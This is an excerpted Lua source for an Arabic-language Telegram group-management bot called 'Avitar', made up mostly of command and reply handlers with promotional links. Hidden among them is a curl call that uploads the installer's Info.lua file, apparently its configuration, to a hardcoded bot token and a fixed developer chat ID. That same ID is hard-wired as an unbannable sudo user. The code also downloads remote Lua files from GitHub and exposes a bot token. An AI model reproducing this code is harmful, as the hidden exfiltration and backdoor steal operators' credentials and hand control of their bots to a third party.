...
if res ~= 200 then
print('\27[0;31m•═════•| 𝙰𝚅𝙸𝚃𝙰𝚁 |•═════•\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \na•═════•| 𝙰𝚅𝙸𝚃𝙰𝚁 |•═════•\n27[0;39;49m')
database:set(id_server..":token",token)
end 
else
print('\27[0;35m•═════•| 𝙰𝚅𝙸𝚃𝙰𝚁 |•═════• ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/Java-ak/Avitar/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1848068919,1614314857,1757394723,1398830949,}   
...
if tonumber(user_id) == tonumber(1848068919) then  
var = true 
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼 𝒔𝒐𝒖𝒓𝒄𝒆 𝒂𝒗𝒊𝒕𝒂𝒓")  
...
local curl = 'curl "'..'https://api.telegram.org/bot1833028811:AAFhC73CuTwejU9QMzADwW7AAojzK0EQOII/sendDocument'..'" -F "chat_id='.. 1848068919 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
--------------------------------------------------------------------------------------------------------------
...
os.execute('wget https://raw.githubusercontent.com/Java-ak/Avitar/main/DRAGON.lua')
...
{{text = 'قناه السورس️️', url="t.me/V_V_I_T_A_R"}}, 
} 
...
send(msg.chat_id_,0," ✯ العضو : {["..data.first_name_.."](T.ME/V_V_I_T_A_R)}\n ✯ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ✯ عذرا ⇐ {["..data.first_name_.."](T.ME/V_V_I_T_A_R)}\n ✯ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
local Text = [[
اهلا بك في سورس افتار🧭
للدخول الي حسابات السورس اتبع الازرار التاليه✅
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'مطور السورس⚙',url="t.me/KL_SH_NK_OF_1"}},
{{text = 'مطور السورس🗽', url="t.me/DV_MI_NA2"}},
{{text = 'قناه السورس 🧭 ', url="t.me/V_V_I_T_A_R"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
local Text = [[
 ✯ اهلا بك في سورس افتار الجمدان لو عايز بوت بأسعار منسبه وبوت مميز كلمني  ✯ 
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
if text == '...اا...' or text == '..........ظ' or text == 'Gava' then
local Text = [[
مبرمج السورس
...
if text == 'مينا'  then
local Text = [[
مطور سورس افتار لو حابب تتواصل معاه اضغط علي الزر ادناه☟
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Dev Mena ➪ ',url="t.me/DV_MI_NA2"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'كلانشكوف'  then
local Text = [[
 مالك سورس افتار لو حابب تتواصل معاه اضغط علي الزر ادناه☟
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Dev Klshnkof ➪ ',url="t.me/KL_SH_NK_OF_1"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'مالك السورس ✅', url="t.me/KL_SH_NK_OF_1"}}, 
{{text = 'مطور السورس🧭', url="t.me/DV_MI_NA2"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
...
if text == 'العاب افتار' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
...
if tonumber(result.sender_user_id_) == tonumber(1848068919) then  
...
if result.id_ == tonumber(1848068919) then
...
if tonumber(userid) == tonumber(1848068919) then  
send(msg.chat_id_, msg.id_, " ✯ لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/Java-ak/Avitar/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ✯ اهلا بك في متجر ملفات افتار\n ✯ ملفات السورس ↓\n•═════•| 𝙰𝚅𝙸𝚃𝙰𝚁 |•═════•\n\n"
local TextE = "\n•═════•| 𝙰𝚅𝙸𝚃𝙰𝚁 |•═════•\n ✯ علامة تعني { ✔️ } ملف مفعل\n ✯ علامة تعني { ✖ } ملف معطل\n ✯ قناة سورس افتار ↓\n".." ✯ [اضغط هنا لدخول](t.me/V_V_I_T_A_R) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/Java-ak/Avitar/main/File_Bot/"..file)
if res == 200 then
...
' }\n'..' ✯  الايدي بالصوره ⇐ { '..idph..
' }\n'..' ✯  الرفع ⇐ { '..setadd..
' }\n'..' ✯  الحظر ⇐ { '..banm..' }\n\n•═════•| 𝙰𝚅𝙸𝚃𝙰𝚁 |•═════•\n ✯ قناة سورس افتار ↓\n [ 𝒔𝒐𝒖𝒓𝒄𝒆 𝒂𝒗𝒊𝒕𝒂𝒓](t.me/V_V_I_T_A_R) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'افتار').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'افتار')
local DRAGON_Msg = {
'ننعم يروحي 😻💙',
'نعم يا قلب  '..Namebot..'',
'عاوز اي من '..Namebot..'',
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝒔𝒐𝒖𝒓𝒄𝒆 𝒂𝒗𝒊𝒕𝒂𝒓.',url="t.me/V_V_I_T_A_R"}},
}
local msg_id = msg.id_/2097152/0.5
...
send(msg.chat_id_,msg.id_, '[انت مطوري نور عنيا🥺🤍](t.me/V_V_I_T_A_R)') 
return false
end

if text == 'انا مين' and DevSoFi(msg) then 
send(msg.chat_id_,msg.id_, '[انت مطوري الثاني حته مني 😍💚](t.me/V_V_I_T_A_R)') 
return false
end

if text == 'انا مين' and Sudo(msg) then 
send(msg.chat_id_,msg.id_, '[انت المطور بس الصغنن 🌝💘](t.me/V_V_I_T_A_R)') 
return false
end

if text == 'انا مين' and CoSu(msg) then 
send(msg.chat_id_,msg.id_, '[نت المالك هن يعني حاجه فوق فوف راسي 😂♥](t.me/V_V_I_T_A_R)') 
return false
end

if text == 'انا مين' and Constructor(msg) then 
send(msg.chat_id_,msg.id_, '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه😹🤦‍♂️](t.me/V_V_I_T_A_R)') 
return false
end

if text == 'انا مين' and BasicConstructor(msg) then 
send(msg.chat_id_,msg.id_, '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🚨](t.me/V_V_I_T_A_R)') 
return false
end

if text == 'انا مين' and Manager(msg) then 
send(msg.chat_id_,msg.id_, '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/V_V_I_T_A_R)') 
return false
end

if text == 'انا مين' and Mod(msg) then 
send(msg.chat_id_,msg.id_, '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/V_V_I_T_A_R)') 
return false
end

if text == 'انا مين' and Special(msg) then 
send(msg.chat_id_,msg.id_, '[ انت مميز ابن ناس 😊 ](t.me/V_V_I_T_A_R)') 
return false
end

if text == 'انا مين' then
send(msg.chat_id_,msg.id_, '[انت مجرد عضو زليل حقير ملوش لزمه 😂](t.me/V_V_I_T_A_R)') 
return false
end
...
if text == 'سلام' then 
send(msg.chat_id_,msg.id_, '[ابق تعاله كليوم..😹💔🎶](t.me/V_V_I_T_A_R)') 
return false
end

if text == 'هاي' or text == 'هيي' then
send(msg.chat_id_,msg.id_, '[علي الواي فاي..😺💜](t.me/V_V_I_T_A_R)') 
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم برايفت والنبي..🥺💜](t.me/V_V_I_T_A_R)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[عليه الصلاه والسلام..💛🙂](t.me/V_V_I_T_A_R)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[نزل عينك عيب كده..🌚♥️](t.me/V_V_I_T_A_R)') 
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[يحلات عيونك..♥️🦋](t.me/V_V_I_T_A_R)')
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[عايز من ده..💋🥀](t.me/V_V_I_T_A_R)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم بف..🙄💔](t.me/V_V_I_T_A_R)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[متزعلش بحبك..😥♥️](t.me/V_V_I_T_A_R)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[وانا كمان بحبك .🥺❤️](t.me/V_V_I_T_A_R)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم بيف ..🙄💔](t.me/V_V_I_T_A_R)')
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[وعليكم السلام ..🖤🌚](t.me/V_V_I_T_A_R)') 
return false
end
end
end
